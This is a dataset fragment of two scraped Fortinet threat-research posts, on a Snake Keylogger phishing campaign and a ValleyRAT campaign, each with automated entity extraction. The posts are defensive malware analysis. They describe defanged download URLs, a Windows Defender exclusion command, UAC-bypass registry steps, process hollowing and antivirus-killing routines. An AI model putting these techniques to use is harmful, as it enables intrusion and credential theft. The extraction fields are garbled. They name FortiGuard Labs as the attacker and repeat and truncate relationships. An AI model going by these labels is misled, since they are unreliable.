    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from the victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently caught a phishing campaign in the wild with a malicious Excel document attached to the phishing email. We performed a deep analysis on the campaign and discovered that it delivers a new variant of Snake Keylogger. Snake Keylogger (aka “404 Keylogger” or “KrakenKeylogger”) is a subscription-based keylogger with many capabilities. It is a .NET-based software originally sold on a hacker forum. Once executed on a victim’s computer, it has the ability to steal sensitive data, including saved credentials from web browsers and other popular software, the system clipboard, and basic device information. It can also log keystrokes and capture screenshots. In the following sections, we will look at the phishing spam, how it lures the recipient into opening a malicious Excel document, how the Excel document downloads and executes a new variant of Snake Keylogger, and what anti-analysis techniques it uses to protect itself from being detected and blocked during the attack. The email content in Figure 1 attempts to deceive the recipient into opening the attached Excel file (swift copy.xls) by claiming that funds have been transferred into their account. To warn the user, the FortiGuard service marks this phishing email as “[virus detected],” as shown in the subject line. Figure 2 shows the content of the attached Excel file when opened in the Office Excel program. Meanwhile, malicious code is executed in the background to download other files. Looking into the binary data of the Excel file, it contains a specially crafted embedded link object that exploits theCVE-2017-0199vulnerability to download a malicious file. Figure 3 displays the embedded link object (“\\x01Ole”). The link is “hxxp[:]//urlty[.]co/byPCO,” which is secretly requested by the Excel program when the file is opened. When the link is accessed, it returns with another URL in the “Location” field of the response header, which is “hxxp[:]//192.3.176[.]138/xampp/zoom/107.hta”.  HTA file is an HTML Application file executed by a Windows application— by default, the HTML Application host (mshta.exe). The 107.hta file is full of obfuscated JavaScript code that is executed automatically when loaded by mshta.exe. Figure 4 shows a partial view of the JavaScript code. After decoding and de-obfuscating the JavaScript code, we were able to get a piece of the VBScript code, as shown in Figure 5. It’s evident that the VBScript code created an object of “Script.Shell” and executed a piece of PowerShell code decoded from a base64 string, defined in the variable “ps_code”. This PowerShell code is then executed by “cmd.exe” (%ComSpec%) when the “shellObj.Run()” function is called. The base64 decoded PowerShell code is shown below. It invokes a Windows API, URLDownloadToFile(), to download an executable file to the victim’s computer and run it after waiting three seconds. The URL of the executable file is hardcoded as “hxxp[:]//192.3.176[.]138/107/sahost.exe” and the local file is “%Appdata%\\sahost.exe”. The PowerShell code finally starts the executable file by callingStart “$Env:AppData\\sahost.exe”. My research shows that the downloaded EXE file (sahost.exe) contains a new variant of Snake Keylogger, which is extracted, decrypted, loaded, and run by the EXE file. I will refer to this downloaded EXE file as the Loader module. Figure 6 is a screenshot of its analysis in a packer detection tool. It was developed using the Microsoft .Net Framework. To protect the Snake Keylogger core module from being detected and blocked by cybersecurity products, sahost.exe uses multiple-layer protection techniques, like transformation and encryption, within several named resources. When sahost.exe starts, it extracts several modules (dlls) onto its memory from the Resource section that provide methods to inquire, extract, decrypt, install, and deploy the core module. The original name of “sahost.exe” is “utGw.exe.” It decrypts and extracts a module called “FGMaker.dll” from a resource named “siri” in its Resource section. Figure 7 shows some of that code. The “FGMaker.dll” module extracts additional modules (such as “Q” and “Gammar.dll”) that work together to extract and decrypt a module called “Tyrone.dll” from the resource “KKki”. You may have noticed in Figure 8 that it loads “KKki” as a Bitmap resource. The module “Tyrone.dll” was encrypted, broken down into bytes, and kept in the Bitmap resource. Figure 9 shows the content of the resource “KKki” as a Bitmap picture. After another decryption sequence, we can see the plaintext of the “Tyrone.dll” module in memory. It is then loaded as an executable module by calling the Assembly.Load() method. Figure 10 showcases the modules that have been extracted and loaded by the Loader module so far. I will refer to “Tyrone.dll” as “Deploy module” in the following analysis. It performs the following functions: This checks whether the current process’s full path is \"% AppData%WeENKtk.exe,\" renames it, and sets attributes (Hidden, ReadOnly, System, etc.) to it if the result is no. On the very first run, it was %AppData%sahost. exe. The Deploy module runs the “schetasks.exe” command to create a new scheduled task in the system Task Scheduler. This allows Snake Keylogger to launch at system startup. Figure 11 shows the scheduled task for Snake Keylogger. The Deploy module obtains a resource data, “I7O14IyvsdO,” from its own Resource section. Then, it decrypts the data with the string key “YRDdITlYRXI” into a final PE file in its memory. This is the core module of Snake Keylogger. Next, the Deploy module performs process hollowing, a malware technique that creates a new process and then inserts malicious code into it to run. This allows it to hide its original process. Figure 12 shows that it about to call the obfuscated API CreateProcess(). It has a key argument, “Creation Flag,” indicating how to create the process. Its value has been set to 134217732, i.e. 0x08000004 in hexadecimal. It is defined as “CREATE_SUSPENDED” and “CREATE_NO_WINDOW.” The process name, the first argument to CreateProcess(), is the same as the Loader module. To complete the process hollowing, it needs to call some relevant Windows APIs, such as ZwUnmapViewOfSection(), VirtualAllocEx(), ReadProcessMemory(), WriteProcessMemory(), GetThreadContext(), SetThreadContext(), and ResumeThread(). The core module's original name is “lfwhUWZlmFnGhDYPudAJ.exe.” Figure 13 shows that the attacker has fully obfuscated the entire module, which displays its entry point (“Main()”) and the obfuscated code, class names, and method names. The Snake Keylogger's structure is very clear. We can see its capability to collect private and sensitive information from the victim’s device, including the device’s basic information, saved credentials, keystrokes, screenshots, and data on the system clipboard. The features are split into different methods driven by Timers. Snake Keylogger also has some relevant flag variables indicating whether the feature is enabled. This variant of Snake Keylogger only enables the credential collection feature. First, Snake Keylogger fetches the device’s basic information, like the PC name, System time, IP address, Country name, Region name, City name, TimeZone, and so on. Figure 14 shows an example of the basic information collected from one of my testing devices. This Snake Keylogger variant includes several hardcoded IP addresses the attacker may believe are used by some sample automatic analysis systems they want to avoid. One method called “anti_bot(),” shown in Figure 15, checks the hardcoded IP addresses. “BotDetected” is returned if the victim’s IP address matches any of those IP addresses. This results in the Snake Keylogger only collecting credentials but never sending them to the attacker. Snake Keylogger collects saved credentials from over 50 popular software programs, categorized as web browsers, email clients, IM clients, and FTP clients. Every software has its own profile folder for saving configuration data. Snake Keylogger traverses all the profile files, looking for the saved credentials. Figure 16 is an example of the method used for Google Chrome. As you may have noticed in the “Locals” tab, it just obtained one set of credentials, including “URL,” “Login ID,” and “Login Password.” All the software can be categorized as follows: Chromium-based Web Browsers:\"Google Chrome,\" \"Amigo,\" \"Xpom,\" \"Kometa,\" \"Nichrome,\" \"CocCoc,\" \"QQ Browser,\" \"Orbitum,\" \"Slimjet,\" \"Iridium,\" \"Vivaldi,\" \"Iron,\" \"Chromium,\" \"Ghost Browser,\" \"Cent Browser,\" \"xVast,\" \"Chedot,\" \"Comodo Dragon,\" \"SuperBird,\" \"360 Browser,” \"360 Chrome,” \"Brave,\" \"Torch,\" \"UC Browser,\" \"Blisk,\" \"Epic PrivacyBrowser,\" \"Liebao,\" \"Avast,\" \"Kinza,\" \"BlackHawk,\" \"Citrio,\" \"Uran,\" \"Coowon,\" \"7Star,” \"QIP Surf,” \"Sleipnir,” \"Chrome Canary,” \"ChromePlus,” \"Sputnik,” \"Microsoft Edge,\" and \"Slim\". Mozilla-based Web Browsers:\"SeaMonkey,” \"IceDragon,” \"CyberFox,” \"WaterFox,” \"Postbox,” and \"PaleMoon\" Other Web Browsers:\"Opera,” \"Firefox\". Email clients:\"FoxMail,” \"Thunderbird\". FTP clients:\"FileZilla\". IM client:\"Pidgin,” \"Discord\". All the credentials collected from the above software are temporarily stored in a global variable. Snake Keylogger variants have several ways to submit harvested credentials to the attacker, including uploading the data onto an FTP server, sending it to an email address, and submitting it over Telegram’s bot over HTTP Post method.  This variant of Snake Keylogger sends data over SMTP. Figure 17 is a screenshot of how it builds the email content. The upper part contains the code that includes the email’s sender, recipient, subject, and body, while the lower part shows the content of the variable “mailMessage” with the data filled by the code. The email’s body contains the computer's basic information saved in a global variable, followed by the credentials stolen from the victim’s computer saved in another global variable. It then creates an SMTP client, and its Send() method is called to send the credentials to the attacker. Figure 18 shows an example of how the email looks in Microsoft Outlook. Figure 19 illustrates the entire workflow of the Snake Keylogger campaign. This analysis reviewed the entire process of this Snake Keylogger campaign, which is being led by a phishing email. The phishing email, which included a malicious Excel document, lured the recipient into opening the file to see the details of a “balance payment.” The Excel document was displayed in different tools, and I explained how it downloads an HTA file by exploiting a known vulnerability. It then leverages multiple language scripts, such as JavaScript, VBScript, and PowerShell, to download the Snake Keylogger’s Loader module. Afterward, I elaborated on how the Loader module extracts multiple modules (including several middle modules and the Deploy module) from the file’s Resource section. Malware often uses a process like this to prevent being detected and analyzed. Next, I introduced how the Snake Keylogger Deploy module establishes persistence on the victim’s computer and conducts process hollowing to put the core module into a newly created process to run. Finally, we examined how the Snake Keylogger steals sensitive information from the victim’s computer and how the stolen data is sent to the attacker using the SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus service detects the attached Excel document, 107.hta, the downloaded executable file and the extracted Snake Keylogger with the following AV signatures. MSExcel/CVE_2017_0199.DDOC!exploitVBS/SnakeKeylogger.119B!tr.dldrMSIL/SnakeKeylogger.FQQD!trMSIL/SnakeKeylogger.AES!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeFortinet Cybersecurity Fundamentals (FCF) training, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://urlty[.]co/byPCOhxxp[:]//192.3.176[.]138/xampp/zoom/107.htahxxp[:]//192.3.176[.]138/107/sahost.exe [swift copy.xls]8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7 [107.hta]6F6A660CE89F6EA5BBE532921DDC4AA17BCD3F2524AA2461D4BE265C9E7328B9 [The Loader module/sahost.exe / WeENKtk.exe / utGw.exe]484E5A871AD69D6B214A31A3B7F8CFCED71BA7A07E62205A90515F350CC0F723 [Snake Keylogger core module / lfwhUWZlmFnGhDYPudAJ.exe]207DD751868995754F8C1223C08F28633B47629F78FAAF70A3B931459EE60714 FortiGuards Labs,limitless keylogger,keylogger FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Attacker), (Malicious Excel document, File), (snake keylogger, Malware), (Fortinet's FortiGuard Labs, Tool), (swift copy.xls, File), (virus detected, Hash)\nRelationships: (FortiGuard Labs, uses, Malicious Excel document), (FortiGuard Labs, performs, deep analysis), (FortiGuard Labs, catches, phishing campaign), (FortiGuard Labs, discovers, new variant of snake keylogger), (FortiGuard Labs, warns, FortiGuard service), (FortiGuard Labs, marks, phishing email), (FortiGuard Labs, uses, virus detected)",
      "entities": [
        [
          "FortiGuard Labs",
          "Attacker"
        ],
        [
          "Malicious Excel document",
          "File"
        ],
        [
          "snake keylogger",
          "Malware"
        ],
        [
          "Fortinet's FortiGuard Labs",
          "Tool"
        ],
        [
          "swift copy.xls",
          "File"
        ],
        [
          "virus detected",
          "Hash"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "uses",
          "Malicious Excel document"
        ],
        [
          "FortiGuard Labs",
          "performs",
          "deep analysis"
        ],
        [
          "FortiGuard Labs",
          "catches",
          "phishing campaign"
        ],
        [
          "FortiGuard Labs",
          "discovers",
          "new variant of snake keylogger"
        ],
        [
          "FortiGuard Labs",
          "warns",
          "FortiGuard service"
        ],
        [
          "FortiGuard Labs",
          "marks",
          "phishing email"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "virus detected"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 6,
    "relationship_count": 7
  },
  {
    "title": "A Deep Dive into a New ValleyRAT Campaign Targeting Chinese Speakers",
    "link": "https://www.fortinet.com/blog/threat-research/valleyrat-campaign-targeting-chinese-speakers",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium FortiGuard Labs recently encountered an ongoing ValleyRAT campaign specifically targeting Chinese speakers. This malware has historically targeted e-commerce, finance, sales, and management enterprises. ValleyRAT is a multi-stage malware that utilizes diverse techniques to monitor and control its victims and deploy arbitrary plugins to cause further damage. Another noteworthy characteristic of this malware is its heavy usage of shellcode to execute its many components directly in memory, significantly reducing its file footprint in the victim’s system. This blog provides a technical analysis of this campaign. This malware uses icons of legitimate applications, including Microsoft Office, with filenames related to financial documents similar to the following: To make the lure more believable to the user, it creates an empty file%TEMP%\\dome.docand executes the default application for opening Microsoft Office Word documents. If no default application is set, it shows an error message box with the text, “Open The Document Fail.” Upon execution, it attempts to create a mutex namedTESTto ensure that only one instance of the malware process is running on the system. After that, it deletes the following registry entries, which could have been added in a previous installation of the malware: It then stores the IP and the port of the Command and Control (C2) in the following registry entry: IpDateInfo = “|i:154.82.85.12|p:5689|” Before continuing, it determines if it’s running under a virtual machine by enumerating all services and checking if any of the following VM-related strings are on the service display names: If any of these services are found, a blank error message box is shown before it terminates. Before the shellcode is executed to load the next stage, this malware uses a known technique called sleep obfuscation to evade memory scanners. This involves adding a callback functionality to Sleep or similar APIs that modify the permissions of the allocated memory where the malicious code resides to values not commonly deemed suspicious by scanners. Furthermore, during this process, the malicious shellcode is encoded with a simple XOR operation to evade pattern-based signatures. After decoding the malicious shellcode using XOR with a single-byte key,0x60in this case, it copies the first 0xc bytes from the Sleep API function and stores it for later use. It then replaces it with code that will lead to executing the malicious callback function. This callback function changes the permission of the malicious shellcode and attempts to obfuscate it using the following procedure: In general, this malware uses shellcode blocks to run its components directly in memory. This shellcode is similar to the one shared in this GitHub repository:https://github.com/killeven/DllToShellCode/blob/master/DllToShellCode/shellcode_data.c. This specific shellcode has also been seen in older malware campaigns and detected by Fortinet as W64/Agent.CCF!tr. Once this malware has finished initializing, it decrypts a shellcode with the AES-256 algorithm using a key derived from a hardcoded 16-byte value. The result is then XOR-ed with0x60to reveal the final shellcode. It then triggers the previously mentioned sleep obfuscation routine by calling the Sleep API before finally executing the shellcode by using it as a callback procedure for theEnumSystemLocalesAAPI. The shellcode uses a hashing algorithm called BKDR to obfuscate the API names, which are then used to search for the target APIs by directly traversing the Process Environment Block (PEB). After checking standard 64-bit PE characteristics from the payload, the shellcode reflectively loads the embedded DLL, in this case, the beaconing module, by copying it to another memory location, adjusting its base relocation, and manually resolving its imports before its entry point is executed. The beaconing module is responsible for loading the RuntimeBroker and RemoteShellcode components. It also allows the malware to persist and gain administrator privileges in the system while ensuring that no AV-related processes are running before it starts communicating with its C2 server. This malware adds a scheduled task to allow its component,Loader- discussed in a later section – to execute automatically upon user login. Furthermore, for theLoadercomponent to be executed with high privilege without triggering Windows’ UAC, it employs a known technique that abuses the auto-elevate properties of the legitimate applications,C:\\Windows\\System32\\zh-CN\\eventvwr.mscorC:\\Windows\\System32\\CompMgmtLauncher.exe.  By design, these applications eventually lead to the execution of the current default value set on the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Command, which will be set to the path of theLoadercomponent in a later stage of infection. It attempts to evade detection from Microsoft Windows Defender by adding the root drive of the malware path to the exclusion by executing the following PowerShell command: Invoke-Command -Command {Add-MpPreference -ExclusionPath {drive} Instead of usually running the command as an argument to the PowerShell process, it uses pipes to communicate with a newly created PowerShell process to execute commands. This could be an attempt to evade AV products that inspect suspicious process arguments. By default, it adds the common root drive \"C:\\\" to the list of excluded paths. If the malware was executed from another root drive, it will also be added to the list. It then proceeds to kill AV-related processes containing the following executable filenames: Notably, the executable names listed are components of products developed by Chinese companies reaffirming their target preference. To determine if the processes have been successfully terminated, it does another scan of the running processes to check if any process with the following executable filenames is still running: If any of these processes are still running, it performs another attempt to kill them by injecting a shellcode with an embedded DLL into a runninglsassprocess. This DLL performs the following procedures: Once the AV processes are no longer running, it modifies the following AV product settings in the registry to disable their autostart and/or reduce their effectiveness: If the AV programs are still found running, the malware process displays an “ERROR” message box and terminates. If the user has administrator privileges, it attempts to execute a new process of itself with elevated privileges without prompting Windows’ UAC(User Access Control) security feature using two known methods. The first method involves abusing the CMSTPLUA COM class, specifically theShellExecmethod of the ICMLuaUtil interface. Since the system automatically grants this class elevated privileges, any process executed using this interface will gain the same. Before using the interface to execute a new process of itself, it attempts to disguise itself as a legitimate explorer.exe process by locating the ProcessParameters structure in the Process Environment Block (PEB) and replacing its ImagePathName and CommandLine fields with the path of the legitimate explorer.exe. The second method exploits another legitimate application called fodhelper.exe.Like the first method, this executable gets high privilege upon execution. First, it creates the registry keyHKCU\\Software\\Classes\\.pwn\\Shell\\Open\\commandand sets its default value to the malware path. Next, it creates another registry key, HKCU\\Software\\Classes\\ms-settings\\CurVer, and sets its default value data to .pwn, associating it with the previously created malicious registry entry. Finally, it executes the legitimate fodhelper.exe, which executes whatever ProgID is defined in the CurVer subkey. This leads to the execution of the malware with high privilege. At this stage, the malware initiates its communication with its C2 to request other components needed for the next stages of the infection. Prior to this, it checks for internet connectivity by attempting to connect to the legitimate Chinese search engine,http://www.baidu.com. The requests sent by this malware at this stage are all in plaintext, but the responses from the C2 are encoded with a randomly generated single-byte XOR key, except for the requests to get the component sizes. This key is included in the malware’s requests in the format{request}_{xor key}. There are three possible configurations with the malware request methods to the C2 and its corresponding procedure for storing and executing succeeding components in the system. In the specific sample we analyzed, it is configured to request two shellcode blocks from its C2: internally namedRemoteShellcodeandRuntimeBroker.To do this, it determines the sizes of the shellcode blocks by sendingGetRemoteShellcodeSize_{xor key}andGetRuntimeBrokerSize_{xor_key}. The sizes received from the C2 are used to check the integrity of the shellcode upon receipt. After that, the C2 sends the shellcode encoded with the XOR key included in the malware’s requests. A traffic example is provided in the image below: RemoteShellCodeandRuntimeBrokerare decoded and injected into newly created processes of legitimate Windows applications C:\\Windows\\System32\\colorcpl.exe and C:\\Windows\\System32\\cleanmgr.exe, respectively. The functions for these components are detailed in the next sections. Meanwhile, the second method is like the first in that they both request two components from the C2—this time, they arewwlib.dll andWinword.exe.While the previous method’s execution of the components takes place in-memory, this method involves writing the components to the disk. Like the previous method, it also requests the sizes of the components. For the size ofwwlib.dll, it sendsGetWwlibSize_{xor key}.Although the sample we analyzed does not contain the request string for retrieving the size ofWinword.exe,extrapolating from the analysis of the first method, it can be assumed that it could sendGetWinWordSize_{xor key}beforehand.After the sizes have been determined, it sendsGetWWlib_{xor key}andGetWinWord_ {xor key}to receive the binaries, which are then written to the%UserProfile%directory.It then executesWinword.exe.Based on other reports,Winword.exeis a legitimate Microsoft Office Word executable, which would then be executed, inadvertently loading the maliciouswwlib.dllupon execution. Finally, the last method sendsGetOnline_{xor key}to download an executable file, which is then saved asalgbg.exein the%UserProfile%directory. It could sendGetOnlineSize_{xor key}to get the executable size beforehand. This shellcode loads and executes a DLL whose primary purpose is downloading a component namedLoaderfrom the C2 server. The DLL sends the request stringsGetLoaderSize_{xor key}andGetLoader_{xor key}to the C2, which responds with the size and the requested executable file, respectively. This file is then saved asLoader.exein the%USERPROFILE%directory.After dropping the executable file, it sets the default value of the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Commandto the said file path. This is to complete the autostart mechanism partially set up by the beaconing module mentioned earlier. This effectively allows the newLoadercomponent to run automatically when the user logs in. At the time of analysis, theLoadercomponent received from the C2 has the same function as the first-stage loader, which is to execute the beaconing module. We can see in the figure below that the WinMain of the first-stageLoaderis very similar to theWinMainof the newerLoaderexecutable from the C2. Fortinet detects these variants asW64/RCShell.A!tr. Setting aside the striking similarities, this new component has a few behaviors outside the first-stage loader, as detailed below. It attempts to detect if it is running inside a sandbox system by counting the files inside the%TEMP%directory. This malware terminates if the number of temporary files is less than 30. Since these systems are restored after every test, they usually have fewer temporary files than conventional systems. To continue execution, it makes sure that any of the following registry keys related to popular communication applications in China are found in the system, further confirming our belief that this malware specifically targets Chinese systems: While the first-stage loader uses the AES-256 algorithm to encrypt the shellcode, an interesting method this malware uses in other samples is to disguise the payload within the malware body by keeping them as UUID strings or IP addresses and then converting these benign-looking strings into their hex-byte equivalent to form the shellcode. The primary purpose of this component is to request the downloader of the ValleyRAT payload. In addition, it contains the embedded configuration marked with the string “codemark” for the payload to use during its execution at a later stage. This configuration is very similar to the previously reported ValleyRat campaigns, where it contains the latest C2 servers as well as other settings for the RAT. To request the payload downloader, it sends the string 64 or 32, depending on the system’s architecture. As shown in the image below, the C2 responds with the payload downloader encoded with XOR, where the key is derived by adding 0x36 to a 10-byte value from the C2's response. Similar to how the earlier components are loaded, the shellcode reflectively loads the embedded payloader DLL and executes its export namedloadwhile passing the previously mentioned configuration as an argument. We detect this component asW64/ValleyRat.A!tr.spy.The C2 configuration from the previous module is decoded by simple string reverse, which is then parsed to configure the downloader. Depending on the configuration, it uses UDP or TCP sockets to connect to the C2 and receive the final payload. First, it will send the size and the key for encrypting the payload, to which the C2 responds with the encoded SHA256 hash of the payload. Lastly, it sends登录模块.dll_bin(translated asLogin module.dll_bin) to request the ValleyRAT malware. A shellcode with the embedded ValleyRAT DLL is then decoded using the same method used to decode the payload downloader. This shellcode is stored in the registry valued33f351a4aeea5e608853d1a56661059on keyHKEY_CURRENT_USER\\Console\\1. Upon execution of the shellcode, the ValleyRAT DLL is reflectively loaded and executed in the system. This relatively new RAT is attributed to the suspected APT group “Silver Fox”. This malware's capabilities are focused on graphically monitoring the user's activities and delivering other plugins and possibly other malware to the victim system. These are the commands supported by this variant: In this article, we have detailed an elaborate and ongoing ValleyRAT campaign specifically targeting Chinese systems. This malware involves several components loaded in different stages and mainly uses shellcode to execute them directly in memory, significantly reducing its file trace in the system. Once the malware gains a foothold in the system, it supports commands capable of monitoring the victim's activities and delivering arbitrary plugins to further the threat actors’ intentions. FortiGuard Labs will continue to monitor this ongoing campaign. FortiGuard AntiVirus detects the malicious files identified in this report as The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. FortiEDR detects the malicious event and is detected by the “Unmapped Executable” rule within the “Exfiltration Prevention” security policy. The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date. We also suggest that organizations have their end users undergo our free NSE training:NSE 1 – Information Security Awareness. It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 154[.]82[.]85[.]12154[.]92[.]19[.]81 1ded5a6c54a7b10365c41bc850ce41f18d86435fbe9315c37bd767ecdf2551357b98622db7a62ace626dcc8af5bb7ac3726a968241c94612c5b9cb906175f5f3fb73e089d0a276617b9a213080f84d0e411592c7db5548790e3fe1c53295f5a3a676c7490086a4112f920936e57ee49e213aaffd12bb38bc433a073ddfae0f241235419877ccc1f1820cc75e773fe79f9ad0296dd8eea9aa44f511a7b6348cfd02aed2b21a90c82d2ca597340aabfa1d6c52302b08aa9f58e87893f6997c268102c8f22e9d2df7e051fffc49c7d2d240787fbe8395b4c3c96be40b5a111a03ce0a971e606e839e7d5e72dcea0a8a3d081c951250ce25b0ddaf2429bad87ebe3d12ae203fa199291754649a4e592fb0880339c88b07f1d69798114afca06b806114bf52de60e60a526141ffe61ef5afc2a3bc7d60d4086e644ec80e67513d268417ff585fadcf40e25ad9d09cf007d20f6691ccf31d93a5d48d25f7e811cb0ca422bfdc52a65905088b8b897a630c66c16ec5c2eba992c1c0722e5c8da9afa18124a871b7b837b217d271747337381fbbcff61edfe44e087c55921564b170a8c947d7ce4ce72ca7e0cebab472e2165a1ebbd9395a60d7478990fd4dbec2eb195f583001d3d4dc0a72c92cf27a390e95e1fad6229d18ab255b625985939eb4b90f7172dff66af9c34958a3b095210664c26a934b5f734b64ea3170f1507a12050372542f81546656de73e009b541ed12cbcc9feced4f6ab79f9e9a0ee9df148b6a76b1c8b026ac9e72ffe8ac1dd8d18abfbb4eb9c23bccb42ab9af2580ed72b7ad8378960ee2bfc32930e19f762f561f4a6448160de2bde6ce330309326d745f898790506401a3bac69f6669a3dd832650e4752ff68dd6f0cef35b43e6ad59d7df8a6b352c45e48e3564e259ade4f544d01900e8c3f9a74e52ae3bc62f74ddf0138b7d3de2c77c59663ec5d8969b688530a3c9228b72807bc17a9822d558c42ee8a47423b59d75e228198450f7a9a2e051eeca6388028a6deb8e9843951bf21575aae7f34bdc0aa362bb42eb5e4cff69b60d67f7f155a3e2b9b905c90a1cc2aac4ad753becec205160b78de45c11ed42f3da707c9cee0688fa4190233a9b4f1379ad9bd41e73eff193caab25960b6a990641ea8d412b5ba456b64ad165b7216c48b50ad87cd7ce19ae30cb709ea3ceb7107b129c64ec9c314157fc6a8df079262bc486ca7291799a7474196c7cf60158421a2d81697e24e693e76cd1da06b9bf1cce8224de916a5eb0c76c9ba7acc3833f8cdc7f7d31a72dfbe69d2be1f8b7cc48d208b80a6608c72c3c590f86d93b074533c0c4ef8a46b6d36ed52cc2b4c179d5d63792ee67c6f1702188695387c64991029dabd702d48eac3ea3f0eef280d4a1ebd3a506c226e98dcedc1b882a11addd25ded8ee5110249b5b1a391e4d77d327 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (ValleyRAT, Malware), (Chinese speakers, Target), (Microsoft Office, Tool), (Temp\\%, File), (Test, Mutex), (Registry, Registry), (Temp\\%, Directory), (Microsoft Office, Tool), (Word, Application), (Mutex, Object), (Temp\\%, Directory)\nRelationships: (FortiGuard Labs, affectedPlatforms, Microsoft Windows), (ValleyRAT, impactedParties, Targeted Windows users), (ValleyRAT, impact, Compromised machines are under the control of the threat actor), (ValleyRAT, severityLevel, Medium), (ValleyRAT, uses, Microsoft Office), (ValleyRAT, uses, Word), (ValleyRAT, uses, Test), (ValleyRAT, uses, Temp%), (ValleyRAT, uses, Word), (ValleyRAT, uses, Mutex), (ValleyRAT, uses, Temp%), (ValleyRAT, uses, Word), (ValleyRAT, uses, Test), (ValleyRAT, uses, Temp%), (ValleyRAT, uses, Word), (ValleyRAT, uses, Test), (ValleyRAT, uses, Temp%), (ValleyRAT, uses, Word), (ValleyRAT, uses, Test), (ValleyRAT, uses, Temp%), (",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "ValleyRAT",
          "Malware"
        ],
        [
          "Chinese speakers",
          "Target"
        ],
        [
          "Microsoft Office",
          "Tool"
        ],
        [
          "Temp\\%",
          "File"
        ],
        [
          "Test",
          "Mutex"
        ],
        [
          "Registry",
          "Registry"
        ],
        [
          "Temp\\%",
          "Directory"
        ],
        [
          "Microsoft Office",
          "Tool"
        ],
        [
          "Word",
          "Application"
        ],
        [
          "Mutex",
          "Object"
        ],
        [
          "Temp\\%",
          "Directory"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "affectedPlatforms",
          "Microsoft Windows"
        ],
        [
          "ValleyRAT",
          "impactedParties",
          "Targeted Windows users"
        ],
        [
          "ValleyRAT",
          "impact",
          "Compromised machines are under the control of the threat actor"
        ],
        [
          "ValleyRAT",
          "severityLevel",
          "Medium"
        ],
        [
          "ValleyRAT",
          "uses",
          "Microsoft Office"
        ],
        [
          "ValleyRAT",
          "uses",
          "Word"
        ],
        [
          "ValleyRAT",
          "uses",
          "Test"
        ],
        [
          "ValleyRAT",
          "uses",
          "Temp%"
        ],
        [
          "ValleyRAT",
          "uses",
          "Word"
        ],
        [
          "ValleyRAT",
          "uses",
          "Mutex"
        ],
        [
          "ValleyRAT",
          "uses",
          "Temp%"
        ],
        [
          "ValleyRAT",
          "uses",
          "Word"
        ],
        [
          "ValleyRAT",
          "uses",
          "Test"
        ],
        [
          "ValleyRAT",
          "uses",
          "Temp%"
        ],
        [
          "ValleyRAT",
          "uses",
          "Word"
        ],
        [
          "ValleyRAT",
          "uses",
          "Test"
        ],
        [
          "ValleyRAT",
          "uses",
          "Temp%"
        ],
        [
          "ValleyRAT",
          "uses",
          "Word"
        ],
        [
          "ValleyRAT",
          "uses",
          "Test"
        ],
        [
          "ValleyRAT",
          "uses",
          "Temp%"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 20
  }
]